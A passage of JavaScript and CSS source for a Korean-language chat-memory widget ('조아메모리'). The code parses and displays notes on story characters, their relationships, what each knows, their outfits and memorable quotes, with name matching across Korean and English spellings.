    .keybox button{flex:none;border:0;border-radius:8px;background:var(--mist);color:var(--ink2);font-size:12px;font-weight:600;padding:5px 9px}
    .srow input[type=text],.srow input[type=password]{height:40px;border:1.5px solid var(--rule);border-radius:12px;padding:0 12px;font-size:14px;background:var(--paper);color:var(--ink);outline:none}
    .switch{-webkit-appearance:none;appearance:none;width:48px;height:28px;margin:0;border-radius:14px;background:var(--rule);position:relative;flex-shrink:0;cursor:pointer;transition:background .15s}
    .switch::after{content:"";position:absolute;top:3px;left:3px;width:22px;height:22px;border-radius:50%;background:#fff;box-shadow:0 1px 3px rgba(0,0,0,.18);transition:left .15s}
    .switch:checked{background:var(--ink)}.switch:checked::after{left:23px}
    @media (prefers-reduced-motion:reduce){.switch,.switch::after{transition:none}}
    .sfoot{font-size:12px;color:var(--graphite);margin:10px 0 0}
    .actions.one{grid-template-columns:1fr}
    .cycles{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:6px;margin-top:10px}
    .cycles button{height:40px;border:1.5px solid var(--rule);border-radius:20px;background:var(--paper);color:var(--ink2);font-size:13.5px;font-weight:600}
    .cycles button[aria-pressed="true"]{background:var(--ink);border-color:var(--ink);color:#fff}
    label.f{display:block;font-size:13px;font-weight:700;margin-top:14px;color:var(--ink2)}
    label.f input{width:100%;height:46px;border:1.5px solid var(--rule);border-radius:14px;padding:0 14px;font-size:15px;margin-top:6px;background:var(--paper);outline:none}
    label.f input:focus,label.f select:focus{border-color:var(--ink)}
    label.f select{display:block;width:100%;height:46px;border:1.5px solid var(--rule);border-radius:14px;padding:0 40px 0 14px;font-size:15px;margin-top:6px;color:var(--ink);outline:none;
      -webkit-appearance:none;appearance:none;background:var(--paper) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' fill='none' stroke='%231F1D24' stroke-width='1.8'/%3E%3C/svg%3E") no-repeat right 16px center}
    .chk{display:flex;align-items:center;gap:10px;font-size:13.5px;margin-top:12px;color:var(--ink2)}
    .chk input{width:18px;height:18px;margin:0;accent-color:var(--ink)}

    /* ── 알림 ── */
    .toast{position:absolute;left:16px;right:16px;bottom:calc(env(safe-area-inset-bottom) + 84px);padding:12px 16px;border-radius:14px;font-size:13.5px;
      line-height:1.55;display:none;z-index:2;background:var(--ink);color:#fff}
    .toast.on{display:block}.t-ok{background:#24493A}.t-err{background:#5E2333}
    .ptoast{position:fixed;left:50%;top:calc(env(safe-area-inset-top) + 12px);transform:translate(-50%,-20px);opacity:0;z-index:2147483002;
      display:flex;align-items:center;gap:8px;max-width:calc(100vw - 32px);padding:10px 16px;border-radius:999px;background:var(--ink);color:#fff;
      font-size:13px;font-weight:600;pointer-events:none;transition:opacity .2s,transform .2s;white-space:nowrap}
    .ptoast svg{display:none}
    .ptoast.on{opacity:1;transform:translate(-50%,0)}
    @media (prefers-reduced-motion:reduce){.ptoast{transition:none}}

    /* ── 컴퓨터: 크랙 화면 위 가운데 노트 한 권 ── */
    @media(min-width:900px){
      :host(.open) .under{background:rgba(31,29,36,.38)}
      .screen{top:50%!important;left:50%;right:auto;width:min(760px,92vw);height:min(880px,90vh)!important;transform:translate(-50%,-50%);border-radius:24px;
        box-shadow:0 30px 80px rgba(31,29,36,.22)}
      header{padding:26px 18px 8px 36px}
      nav.top{padding:6px 36px 12px}
      main{padding:22px 36px 40px}
      .seg,.centers,.cast-row{margin-left:-36px;margin-right:-36px;padding-left:36px;padding-right:36px}
      .actions{padding:12px 36px 18px}
      .toast{left:auto;right:24px;width:380px;bottom:24px}
    }
  </style>
  <button class="fab" data-act="toggle" aria-label="조아메모리 열기">${icon('mark', 'currentColor', 16)}<span data-out="fab">기억</span></button>
  <div class="under" data-act="close" aria-hidden="true"></div>
  <div class="screen" role="dialog" aria-label="조아메모리">
    <header data-out="header"></header>
    <nav class="top" data-out="tabs"></nav>
    <main data-out="main"></main>
    <div data-out="bottom"></div>
    <div class="toast" data-out="toast"></div>
  </div>
  <div class="ptoast" data-out="ptoast" role="status"></div>`;

  const ui = sel => root.querySelector(sel);
  const out = name => ui(`[data-out="${name}"]`);

  const WIDE = matchMedia('(min-width: 900px)');
  // 아이폰 사파리: 실제로 보이는 높이에 맞추고, 뒤 페이지 스크롤을 잠급니다.
  function fitScreen() {
    const s = ui('.screen'), vv = window.visualViewport;
    if (WIDE.matches) { s.style.height = s.style.top = ''; return; } // 컴퓨터: 가운데 큰 창 (CSS가 크기를 정함)
    if (vv) { s.style.height = vv.height + 'px'; s.style.top = vv.offsetTop + 'px'; }
    else { s.style.height = window.innerHeight + 'px'; s.style.top = '0px'; }
  }
  const isOpen = () => host.classList.contains('open');
  if (window.visualViewport) ['resize', 'scroll'].forEach(ev => window.visualViewport.addEventListener(ev, () => { if (isOpen()) fitScreen(); }));
  window.addEventListener('resize', () => { if (isOpen()) fitScreen(); });
  let savedOverflow = null;
  function lockPage(on) {
    const de = document.documentElement, b = document.body;
    if (on && savedOverflow === null) { savedOverflow = [de.style.overflow, b?.style.overflow ?? '']; de.style.overflow = 'hidden'; if (b) b.style.overflow = 'hidden'; }
    if (!on && savedOverflow !== null) { de.style.overflow = savedOverflow[0]; if (b) b.style.overflow = savedOverflow[1]; savedOverflow = null; }
  }
  const openSheet = on => { host.classList.toggle('open', on); lockPage(on); if (on) fitScreen(); };

  // ══════════════════════════════════════════════════════════════
  // 10. 상태
  // ══════════════════════════════════════════════════════════════
  let snapshot = null, draft = null, cycle = 25, busyNow = false, loading = false, movedInfo = '', usage = [];
  const fresh = () => ({ tab: 'home', view: null, key: null, mem: '현재상태', ppl: 'list', thread: 'open' });
  let nav = fresh();

  function toast(text, kind = 'info', ms = 0) {
    const t = out('toast'); t.textContent = text; t.className = 'toast on t-' + kind;
    clearTimeout(toast.timer); if (ms) toast.timer = setTimeout(() => { t.className = 'toast'; }, ms);
  }
  const quiet = () => { out('toast').className = 'toast'; };
  function pageToast(text) {
    const t = out('ptoast'); t.innerHTML = icon('move', '#fff', 15) + `<span>${esc(text)}</span>`; t.classList.add('on');
    clearTimeout(pageToast.timer); pageToast.timer = setTimeout(() => t.classList.remove('on'), 3200);
  }
  const freshTurns = () => (snapshot ? snapshot.fresh.filter(m => msgRole(m) === 'user').length : 0);
  let fullNote = null; // { upto, memory } — 근거·번역까지 들어간 전체본
  let histList = []; // 회차별 바뀐 것 화면이 보는 기록
  const noteMemory = () => { const n = snapshot?.note; return n ? (fullNote && fullNote.upto === n.upto ? fullNote.memory : n.memory) : ''; };
  // 전체본을 채팅에 넣으면 나올 글과 실제 채팅 노트가 같은지(공백·따옴표 모양 차이는 무시).
  const chatShape = t => String(t).replace(/["“”]/g, '').replace(/\s+/g, '');
  const sameAsChat = (full, chatMemory) => chatShape(stripProof(full)) === chatShape(chatMemory);
  const saveFull = (chatId, upto, memory, turns = 0, at = new Date().toISOString()) => { fullNote = { upto, memory, turns, at }; return setValue('full:' + chatId, JSON.stringify(fullNote)); };
  const sections = () => (snapshot?.note ? splitSections(noteMemory()) : []);
  const bodyOf = key => sections().find(s => s.key === key)?.body || '';

  // ══════════════════════════════════════════════════════════════
  // 11. 화면 조각
  // ══════════════════════════════════════════════════════════════
  const AV = [['#E6E0FA', '#4B3F8A'], ['#F9E0EA', '#93405F'], ['#DFEFE5', '#2F6A4C'], ['#DCEAF8', '#2F5F8F'], ['#FBE4D4', '#94522B'], ['#F7EDCB', '#7A6420']];
  const avColor = name => AV[[...String(name)].reduce((a, c) => a + c.charCodeAt(0), 0) % AV.length];
  // 프로필(이모지·성별·특징)은 그릴 때마다 인물 칸에서 다시 읽습니다.
  let PROF = new Map();
  const shortName = name => { const t = [...String(name).trim()]; return /[가-힣]/.test(name) ? (t.length >= 3 ? t.slice(-2) : t).join('') : t.slice(0, 2).join(''); };
  let ANIM = new Map();
  const ANIMALS = ['🐱', '🐶', '🦊', '🐰', '🐻', '🐼', '🐨', '🐯', '🦁', '🐺', '🦌', '🐧', '🦉', '🐹', '🐿️', '🦢'];
  const animalOf = name => ANIMALS[[...String(name)].reduce((a, c) => a * 31 + c.charCodeAt(0), 7) % ANIMALS.length];
  // 이름표: 색 없이 굵은 글자만 (색은 얼굴 동그라미와 상태 칩에만)
  const nameChip = name => `<b class="nchip">${esc(name)}</b>`;
  const avatar = name => {
    const [bg, fg] = avColor(name), pr = PROF.get(name) || {};
    const inner = `<span class="av-e">${esc(ANIM.get(name) || pr.emoji || animalOf(name))}</span>`;
    return `<span class="av" style="background:${bg};color:${fg}">${inner}</span>`;
  };
  const KSTYLE = {
    '알고 있음': ['#EEEEFC', '#4545B8', '#D5D5F6', true], '모름': ['#F1F2F6', '#6B7083', '#E2E4EC'], '일부만 앎': ['#E6F0FB', '#2F6FB8', '#C9DDF4'],
    '의심': ['#FBF1DE', '#8A5E10', '#EBD6A9'], '전해 들음': ['#F1ECFB', '#6A4BB8', '#DCCFF3'], '부정': ['#FBEAEE', '#A23C50', '#F0C9D1'],
    '오해': ['#FBF1DE', '#8A5E10', '#E8CB8E'], '잊음': ['#F1F2F6', '#8A8FA0', '#E2E4EC'],
  };

  // 새 형식: 【이름】 한 덩어리 = 그 인물의 설명 · → 상대별 호칭·관계 · 알고 있음/모름/…/숨김
  const KNOW_LINE = new RegExp(`^(${[...KNOW, '숨김'].join('|')})\\s*[:：]\\s*(.*)$`);
  // 같은 사람인지: "주태정"과 "태정"처럼 한쪽이 다른 쪽의 앞·뒤 2글자 이상과 같으면 같은 사람으로 봅니다.
  // ponytail: 이름 앞뒤 일치만 봄. "김민"·"김민수"처럼 실제로 다른 두 사람이면 합쳐져요. 그런 이야기면 별명표를 따로 두세요.
  // 한글 이름 ↔ 영어 이름(가브리엘 ↔ Gabriel, 가브리엘 케인 ↔ Gabriel Kane)도 같은 사람으로 보려고, 두 이름을 "자음 뼈대"로 바꿔 견줍니다.
  //   예) 가브리엘 → k·p·l / Gabriel → k·p·l. 괄호 이름 "가브리엘(Gabriel)"은 두 이름 다 별명으로 칩니다.
  // ponytail: 발음이 비슷한 다른 사람이면 합쳐질 수 있어요(동명이인은 없다고 보고 넉넉하게 봄). 그런 이야기면 별명표를 따로 두세요.
  const IN_C = ['k','kk','n','t','tt','l','m','p','pp','s','ss','','j','jj','s','k','t','p','h'];
  const FIN_C = ['','k','kk','ks','n','nj','nh','t','l','lk','lm','lp','ls','lt','lp','lh','m','p','ps','s','ss','n','j','s','k','t','p','h'];
  const skelOf = t => {
    let out = '';
    if (/[가-힣]/.test(t)) {
      for (const ch of String(t)) { const c = ch.charCodeAt(0) - 0xAC00; if (c < 0 || c > 11171) continue; out += IN_C[Math.floor(c / 588)] + FIN_C[c % 28]; }
    } else {
      out = String(t).toLowerCase().replace(/th/g, 's').replace(/ck/g, 'k').replace(/ng/g, 'n').replace(/ph/g, 'p').replace(/qu/g, 'k').replace(/x/g, 'ks').replace(/[^a-z]/g, '')
        .replace(/[aeiouyhw]/g, '').replace(/[gqc]/g, 'k').replace(/[dt]/g, 't').replace(/[bvf]/g, 'p').replace(/[rl]/g, 'l').replace(/[zj]/g, 's');
    }
    return out.replace(/h/g, '').replace(/(.)\1+/g, '$1');
  };
  const nameForms = n => { n = String(n || '').trim();
    // 괄호·슬래시·점 등으로 이름이 여러 개 붙어 있어도 조각내고, 한글+영어가 섞인 조각은 한글 이름·영어 이름으로 또 나눕니다
    const parts = n.split(/\s*[()（）\/|·,，、]\s*|\s+[-–—]\s+/).map(x => x.trim()).filter(Boolean), out = new Set(parts.length ? parts : [n]);
    for (const x of [...out]) if (/[가-힣]/.test(x) && /[A-Za-z]/.test(x)) { const k = x.match(/[가-힣][가-힣\s]*/g), e = x.match(/[A-Za-z][A-Za-z\s.'-]*/g);
      if (k) out.add(k.join(' ').trim()); if (e) out.add(e.join(' ').trim()); }
    return [...out].filter(Boolean); };
  const sameName1 = (a, b) => { a = String(a || '').trim().toLowerCase(); b = String(b || '').trim().toLowerCase(); if (a === b) return !!a;
    const [s, l] = [...a].length < [...b].length ? [a, b] : [b, a]; return [...s].length >= 2 && (l.endsWith(s) || l.startsWith(s)); };
  // 이름 전체 뼈대가 앞부분부터 같거나, 이름 조각(이름·성) 하나라도 한글↔영어로 뼈대가 같으면 같은 사람 (동명이인은 없다고 보고 넉넉하게)
  const crossName = (a, b) => { const ha = /[가-힣]/.test(a), hb = /[가-힣]/.test(b); if (ha === hb) return false;
    const x = skelOf(a), y = skelOf(b); if (x.length >= 2 && y.length >= 2) { const [s, l] = x.length <= y.length ? [x, y] : [y, x]; if (l === s || l.startsWith(s)) return true; }
    const tk = t => String(t).split(/\s+/).map(skelOf).filter(k => k.length >= 2); const ty = tk(b);
    return tk(a).some(k => ty.includes(k)); };
  const sameName = (a, b) => nameForms(a).some(x => nameForms(b).some(y => sameName1(x, y) || crossName(x, y)));
  // "가브리엘 케인 (Gabriel Kane)"처럼 한글 이름에 영어 이름이 붙어 있으면 화면·목록에는 한글 이름만 씁니다
  const cleanName = n => { const f = nameForms(n), k = f.find(x => /[가-힣]/.test(x)); return k && f.some(x => /^[A-Za-z]/.test(x)) ? k : n; };
  // 노트의 【이름】 목록에 맞춰 짧게 부른 이름을 정본 이름으로 바꿉니다. 딱 한 명에게만 맞을 때만.
  let CANON = [];
  const canon = x => { x = String(x || '').trim(); if (!x || CANON.includes(x)) return x; const hit = CANON.filter(n => sameName(n, x)); return hit.length === 1 ? hit[0] : x; };
  function personsIn(body) {
    const list = []; let cur = null;
    for (const raw of String(body || '').split('\n')) {
      const l = raw.trim();
      if (!l || isNone(l)) continue;
      const h = l.match(/^【(.+?)】\s*(.*)$/);
      if (h) {
        // 【태정】과 【주태정】이 따로 있으면 한 사람으로 합치고 긴 이름을 씁니다.
        const nm = cleanName(h[1].trim()), dup = list.find(p => sameName(p.name, nm));
        if (dup) { if ([...nm].length > [...dup.name].length) dup.name = nm; if (h[2].trim() && !dup.desc.includes(h[2].trim())) dup.desc += (dup.desc ? ' · ' : '') + h[2].trim(); cur = dup; continue; }
        cur = { name: nm, desc: h[2].trim(), outfit: '', outfitQ: null, rels: [], know: [], memories: [], last: null }; list.push(cur); continue;
      }
      if (!cur) continue;
      // 향후 계획·고민은 설명에 섞지 않고 따로 (인물 화면에서 한 줄씩)
      const pl = l.match(/^(향후 계획|고민)\s*[:：]\s*(.*)$/);
      if (pl) { cur[pl[1] === '고민' ? 'worry' : 'plan'] = pl[2].trim(); continue; }
      const mem = l.match(/^함께한 일\s*[:：]\s*(.*)$/);
      if (mem) { cur.memories.push(...mem[1].split(/\s+·\s+/).map(x => x.trim()).filter(Boolean)); continue; }
      const pf = l.match(/^프로필\s*[:：]\s*(.*)$/);
      if (pf) {
        for (const part of pf[1].split(/\s*·\s*/).filter(Boolean)) {
          if (/^(유저|사용자|user|pc|유저\s*[(（]\s*pc\s*[)）])$/i.test(part)) cur.isUser = true;
          else if (!cur.emoji && /\p{Extended_Pictographic}/u.test(part) && part.length <= 8) cur.emoji = part.trim();
          else if (!cur.gender && /^(여|남|여성|남성|여자|남자)$/.test(part)) cur.gender = part[0];
          else cur.tag = cur.tag ? cur.tag + ' · ' + part : part;
        }
        continue;
      }
      const o = l.match(/^복장\s*[:：]\s*(.*)$/);
      if (o) { cur.outfit = o[1].trim(); cur.outfitQ = { quote: '', tr: '' }; cur.last = [cur.outfitQ]; continue; }
      // 근거 줄은 바로 위 복장·관계·인지 줄에 붙입니다.
      const q = l.match(/^근거\s*[:：]\s*(.*)$/);
      if (q) { if (cur.last) cur.last.forEach(x => { x.quote = q[1].replace(/^["“]|["”]$/g, ''); }); continue; }
      const t = l.match(/^번역\s*[:：]\s*(.*)$/);
      if (t) { if (cur.last) cur.last.forEach(x => { x.tr = t[1].replace(/^["“]|["”]$/g, ''); }); continue; }
      // "전환: 날짜 · 계기 · 그 뒤 태도" 줄은 바로 위 관계 줄에 붙습니다.
      const tn = l.match(/^전환\s*[:：]\s*(.*)$/);
      if (tn) { const r = cur.rels[cur.rels.length - 1]; if (r) (r.turns ||= []).push(tn[1].trim()); continue; }
      // "서윤 → 유진: …"(새 형식)과 "→ 유진: …"(예전 형식) 둘 다 읽습니다. 앞 이름이 이 인물이 아니면 관계 줄이 아니에요.
      const r0 = l.match(/^(?:(.+?)\s*)?(?:→|->)\s*(.+?)\s*[:：]\s*(.*)$/);
      const r = r0 && (!r0[1] || sameName(r0[1], cur.name)) ? [r0[0], r0[2], r0[3]] : null;
      if (r) {
        const rel = { to: canon(r[1]), text: r[2].trim(), quote: '' };
        if (cur.rels.some(x => x.to === rel.to && x.text === rel.text)) { cur.last = null; continue; } // 같은 줄 두 번 방지
        cur.rels.push(rel); cur.last = [rel]; continue;
      }
      let last = null; cur.last = [];
      for (const part of l.split(/\s+\/\s+/)) {
        const k = part.match(KNOW_LINE);
        if (k) { last = { kind: k[1], text: k[2].trim(), quote: '' }; cur.know.push(last); cur.last.push(last); }
        else if (last) last.text += ' / ' + part;
        else cur.desc += (cur.desc ? ' · ' : '') + bullet(part);
      }
    }
    return list;
  }
  const isNewPeople = body => /^\s*【/m.test(String(body || ''));
  const newFormat = () => isNewPeople(bodyOf('인물'));
  const persons = () => personsIn(bodyOf('인물'));
  // "「유진 씨」·존댓말 · 계약 상대에서 …" → 앞 덩어리는 호칭·말투, 나머지는 관계
  const SPEECH_BIT = /「|존댓말|반말|혼용/;
  const speechCut = t => { const p = String(t).split(/\s+·\s+/); let i = 0; while (i < p.length && SPEECH_BIT.test(p[i])) i++; return [p.slice(0, i).join(' · '), p.slice(i).join(' · ')]; };
  const speechPart = t => speechCut(t)[0] || t;
  const relPart = t => speechCut(t)[1] || t;
  // "「중위님」·반말, 「자기야」·존댓말 혼용" → [{addr:'중위님', reg:'반말'}, {addr:'자기야', reg:'존댓말 혼용'}]
  function speechChips(t) {
    const out = [], extra = [];
    const REG = /(?:존댓말|반말)(?:\s*[·\/,，]?\s*(?:존댓말|반말))?(?:\s*혼용)?|혼용/;
    for (const seg of String(t).split(/\s*[,，]\s*(?=「)|\s+·\s+(?=「)/)) {
      const addrs = [...seg.matchAll(/「([^」]+)」/g)].map(m => m[1]);
      const reg = ((seg.match(REG) || [])[0] || '').replace(/\s*[·\/,，]\s*/g, '·').trim();
      const rest = seg.replace(/「[^」]+」/g, '').replace(REG, '').replace(/[·,，\s]+/g, ' ').trim();
      if (addrs.length || reg) out.push({ addr: addrs, reg }); if (rest) extra.push(rest);
    }
    return { chips: out, extra: extra.join(' · ') };
  }
  // 말투(존댓말·반말)는 제목 옆 작은 태그, 아래 줄엔 호칭 칩만
  const regTag = c => { const r = [...new Set(c.chips.map(x => x.reg).filter(Boolean))].join(' / '); return r ? ` <span class="reg-tag">${esc(r)}</span>` : ''; };
  const addrHtml = c => `<div class="addrs">${c.chips.flatMap(x => x.addr).map(a => `<span class="addr">「${esc(a)}」</span>`).join('')}</div>`;
  // 노트에 나오는 인물 이름 (빠진 인물 확인용)
  function namesIn(memory) {
    const body = splitSections(memory).find(s => s.key === '인물')?.body || '';
    if (isNewPeople(body)) return personsIn(body).map(p => p.name);
    return itemsOf(body).map(l => { const i = l.search(/[:：]/); return (i > 0 ? l.slice(0, i) : l).trim(); }).filter(n => n && [...n].length <= 16);
  }
  // 현재상태 ▸ 옷차림: "- 이름: 옷 · 옷" + 바로 아래 근거·번역
  function outfits() {
    const blk = blocksOf(bodyOf('현재상태')).find(b => /옷차림|복장|의상/.test(b.title || ''));
    const list = [];
    if (blk) for (const l of blk.lines) {
      let m;
      if ((m = l.match(/^근거\s*[:：]\s*(.*)$/))) { if (list.length) list[list.length - 1].quote = m[1].replace(/^["“]|["”]$/g, ''); continue; }
      if ((m = l.match(/^번역\s*[:：]\s*(.*)$/))) { if (list.length) list[list.length - 1].tr = m[1].replace(/^["“]|["”]$/g, ''); continue; }
      if ((m = l.match(/^(.{1,16}?)\s*[:：]\s*(.+)$/))) list.push({ name: canon(m[1]), text: m[2].trim(), quote: '', tr: '' });
    }
    if (!list.length && newFormat()) for (const x of persons()) if (x.outfit) list.push({ name: x.name, text: x.outfit, quote: x.outfitQ?.quote || '', tr: x.outfitQ?.tr || '' });
    return list;
  }
  const wearHtml = t => {
    const it = String(t).split(/\s*[·,，]\s*/).filter(Boolean), chips = a => `<div class="wear">${a.map(w => `<span>${esc(w)}</span>`).join('')}</div>`;
    if (it.length < 5) return chips(it);
    const G = [['의복', []], ['신발', []], ['장신구', []], ['모습', []]];
    for (const w of it) G[/신발|버선|짚신|꽃신|구두|양말|맨발/.test(w) ? 1 : /노리개|팔찌|가락지|반지|목걸이|귀걸이|비녀|금방울|매듭|노끈|손수건|패물|장신구|시계|안경|댕기|방울/.test(w) ? 2 : /단정|정돈|머리|헝클|젖|찢|흐트|땀|상태|묶/.test(w) ? 3 : 0][1].push(w);
    return G.filter(g => g[1].length).map(g => `<div class="wg"><span class="wk">${g[0]}</span>${chips(g[1])}</div>`).join('');
  };
  // 화면 공통 모양 — 항목 = 굵은 제목 한 줄 + 아래 내용, 사람별 내용은 '이름 | 내용' 두 칸 표
  const itemHtml = (title, body, sub = '') => `<section class="item"><h4>${title}</h4>${sub ? `<p class="item-sub">${sub}</p>` : ''}${body}</section>`;
  const kvHtml = (rows, cls = '') => rows.length ? `<div class="kv${cls ? ' ' + cls : ''}">${rows.map(([k, v]) => `<span class="k">${k}</span><span class="v">${v}</span>`).join('')}</div>` : '';
  const pillHtml = state => { const [bg, fg] = KSTYLE[state] || KSTYLE['모름']; return `<span class="pill" style="background:${bg};color:${fg}">${esc(state)}</span>`; };
  const factBody = f => kvHtml([
      ...f.who.map(w => [`${nameChip(w.name)} ${pillHtml(w.state)}`, `${w.note ? esc(w.note) : ''}${quoteHtml(w.quote, w.tr)}`]),
      ...f.hide.map(h => { const [a, b] = h.split(/\s*→\s*/); return ['숨김', b ? `${nameChip(a.trim())}<i class="nar">→</i>${nameChip(b.trim())}` : esc(h)]; }),
      ...f.extra.map(x => ['', esc(x)]),
    ], 'kv-stack') + quoteHtml(f.quote, f.tr); // 인지: 이름이 길어도 설명이 눌리지 않게 이름 아래로
  // 자각 표시는 두 글자로: 자각 / 무자각 / 부정 / 숨김 (예전 표현 자각함·모름도 같은 말로 보여요)
  const AWARE = { '자각함': '자각', '자각': '자각', '모름': '무자각', '무자각': '무자각', '부정': '부정', '숨김': '숨김' };
  function feelings() {
    return blocksOf(bodyOf('감정선')).filter(b => b.title).map(b => {
      const m = b.title.match(/^(.+?)\s*(?:→|->)\s*(.+)$/), steps = [];
      for (const l of b.lines) {
        let q;
        if ((q = l.match(/^근거\s*[:：]\s*(.*)$/))) { if (steps.length) steps[steps.length - 1].quote = q[1].replace(/^["“]|["”]$/g, ''); continue; }
        if ((q = l.match(/^번역\s*[:：]\s*(.*)$/))) { if (steps.length) steps[steps.length - 1].tr = q[1].replace(/^["“]|["”]$/g, ''); continue; }
        const star = /^\s*★/.test(l), p = l.replace(/^\s*★\s*/, '').split(/\s*[|｜]\s*/);
        const aware = p.length >= 4 && /^(자각|무자각|모름|부정|숨김)/.test(p[p.length - 1]) ? p.pop() : '';
        steps.push(p.length >= 3 ? { star, date: p[0], feel: p[1], why: p.slice(2).join(' · '), aware, quote: '', tr: '' } : { star, date: '', feel: p.join(' '), why: '', aware, quote: '', tr: '' });
      }
      return { from: m ? canon(m[1]) : b.title, to: m ? canon(m[2]) : '', steps };
    });
  }
  const editKey = key => (newFormat() && (['관계·감정선', '호칭·말투'].includes(key) || (key === '인지·비밀' && !factsNew())) ? '인물' : key);

  const splitNames = t => t.split(/\s*(?:\/|·|,|、|&|그리고|및)\s*/).map(x => x.trim()).filter(Boolean);
  function pairs(key) {
    if (newFormat() && (key === '관계·감정선' || key === '호칭·말투'))
      return persons().flatMap(p => p.rels.filter(r => r.to !== p.name).map(r => ({ from: p.name, to: r.to, text: key === '호칭·말투' ? speechPart(r.text) : relPart(r.text), quote: key === '호칭·말투' ? '' : r.quote, tr: r.tr || '', turns: key === '호칭·말투' ? [] : r.turns || [] })));
    return itemsOf(bodyOf(key)).flatMap(l => {
      const m = l.match(/^(.+?)\s*(?:→|->|⇒)\s*(.+?)\s*[:：]\s*(.*)$/);
      if (!m) return [];
      const out = [];
      for (const f of splitNames(m[1]).map(canon)) for (const t of splitNames(m[2]).map(canon)) if (f !== t) out.push({ from: f, to: t, text: m[3].trim() });
      return out;
    });
  }
  function people() {
    if (newFormat()) return new Map(persons().map(p => [p.name, p.desc]));
    const map = new Map();
    for (const l of itemsOf(bodyOf('인물'))) {
      const i = l.search(/[:：]/), name = (i > 0 ? l.slice(0, i) : l).trim();
      if (name && [...name].length <= 16) map.set(name, i > 0 ? l.slice(i + 1).trim() : '');
    }
    return map;
  }
  // 인지 칸: ### 정보 제목 / - 내용: / - 상태: / - 숨김: / - 근거:
  // ▸ 정보: 실제 / - 이름: 상태 — 메모 / - 숨김: A → B / - 근거 / - 번역
  function factsIn(body) {
    const stateRe = new RegExp(`^(.+?)\\s*[:：]\\s*(${KNOW.join('|')})\\s*(?:[—–-]+\\s*(.*))?$`);
    const unq = t => t.replace(/^["“]|["”]$/g, '');
    return blocksOf(body).filter(b => b.title).map(b => {
      const ci = b.title.search(/[:：]/);
      const f = { title: (ci > 0 ? b.title.slice(0, ci) : b.title).trim(), content: ci > 0 ? b.title.slice(ci + 1).trim() : '', who: [], hide: [], quote: '', tr: '', extra: [] };
      let last = null;
      for (const l of b.lines) {
        let m;
        if ((m = l.match(/^근거\s*[:：]\s*(.*)$/))) { if (last) last.quote = unq(m[1]); else f.quote = unq(m[1]); continue; }
        if ((m = l.match(/^번역\s*[:：]\s*(.*)$/))) { if (last) last.tr = unq(m[1]); else f.tr = unq(m[1]); continue; }
        if ((m = l.match(/^숨김\s*[:：]\s*(.*)$/))) { const h = m[1].match(/^(.+?)\s*(?:→|->)\s*(.+)$/); f.hide.push(h ? `${canon(h[1])} → ${canon(h[2])}` : m[1]); last = null; continue; }
        if ((m = l.match(stateRe))) { last = { name: canon(m[1]), state: m[2], note: (m[3] || '').trim(), quote: '', tr: '' }; f.who.push(last); continue; }
        f.extra.push(l);
      }
      return f;
    });
  }
  const factsNew = () => /^\s*▸/m.test(bodyOf('인지·비밀'));
  function facts() {
    if (factsNew()) return factsIn(bodyOf('인지·비밀'));
    if (newFormat()) {
      // 같은 정보를 여러 인물이 가지고 있으면 한 줄로 모읍니다.
      const byTitle = new Map();
      const get = t => { if (!byTitle.has(t)) byTitle.set(t, { title: t, content: '', who: [], hide: [], quote: '', extra: [] }); return byTitle.get(t); };
      for (const p of persons()) for (const k of p.know) {
        const f = k.kind === '숨김' ? (() => { const m = k.text.match(/^(.+?)에게\s*(.+)$/); const f = get(m ? m[2].trim() : k.text); f.hide.push(m ? `${p.name} → ${m[1].trim()}` : `${p.name} 숨김`); return f; })()
          : (get(k.text).who.push({ name: p.name, state: k.kind, note: '' }), get(k.text));
        if (k.quote && !f.quote) { f.quote = k.quote; f.tr = k.tr || ''; }
      }
      return [...byTitle.values()];
    }
    const stateRe = new RegExp(`^(.+?)\\s+(${KNOW.join('|')})\\s*(.*)$`);
    return blocksOf(bodyOf('인지·비밀')).map(b => {
      const f = { title: b.title, content: '', who: [], hide: [], quote: '', extra: [] };
      for (const l of b.lines) {
        const m = l.match(/^(내용|상태|숨김|근거)\s*[:：]\s*(.*)$/);
        if (!m) { f.extra.push(l); continue; }
        if (m[1] === '내용') f.content = m[2];
        if (m[1] === '근거') f.quote = m[2].replace(/^["“]|["”]$/g, '');
        if (m[1] === '숨김') {
          const h = m[2].match(/^(.+?)(?:이|가)\s+(.+?)에게\s*숨김/) || m[2].match(/^(.+?)\s*(?:→|->)\s*(.+)$/);
          f.hide.push(h ? `${h[1].trim()} → ${h[2].trim()}` : m[2]);
        }
        if (m[1] === '상태') f.who = m[2].split(/\s*[\/,]\s*/).map(s => { const k = s.trim().match(stateRe); return k ? { name: k[1].trim(), state: k[2], note: k[3].replace(/^["“]|["”]$/g, '').trim() } : null; }).filter(Boolean);
      }
      // 예전 한 줄 형식 "정보 — A 알고 있음 / B 모름"
      if (!f.title && b.lines.length) {
        const l = b.lines[0], cut = l.search(/\s[—–]\s|\s-\s/);
        f.title = cut > 0 ? l.slice(0, cut) : l;
        if (cut > 0) f.who = l.slice(cut).replace(/^\s*[—–-]\s*/, '').split(/\s*[\/,]\s*/).map(s => { const k = s.trim().match(stateRe); return k ? { name: k[1], state: k[2], note: k[3].trim() } : null; }).filter(Boolean);
      }
      return f;
    });
  }
  // 명대사: "화자 → 상대: "대사"" + 바로 아래 "번역:" · "장면:" 줄 (예전 형식의 대사 뒤 (괄호)도 장면으로 읽음)
  //   명대사는 노트와 따로 이 기기에 모읍니다(quotes:채팅). 아직 없으면 예전처럼 노트의 명대사 칸을 씁니다.
  let quoteStore = '';
  const quoteBody = () => quoteStore || bodyOf('명대사');
  const quoteLine = q => `${q.who || '?'}${q.to ? ` → ${q.to}` : ''}: "${q.text}"${q.tr ? `\n번역: ${q.tr}` : ''}${q.ctx ? `\n장면: ${q.ctx}` : ''}`;
  async function saveQuotes(chatId, list) { quoteStore = list.map(quoteLine).join('\n') || ' '; await setValue('quotes:' + chatId, quoteStore); }
  // AI가 어떤 모양으로 줘도(별표 번역·괄호 번역·다른 따옴표·줄바꿈 제각각) 가브리엘 케인 모양(원문/번역/화자→상대·🎬장면)으로 맞춥니다
  function quotes() {
    const qs = [], unq = t => String(t).replace(/^[\s"“”「『*_]+|[\s"”“」』*_]+$/g, '');
    for (const raw of itemsOf(quoteBody().trim())) {
      const line0 = raw.replace(/^\s*(?:[-•·▪◦]|\d{1,2}[.)])\s+/, '').replace(/\*\*|__/g, '').trim();
      if (!line0) continue;
      const last = qs[qs.length - 1];
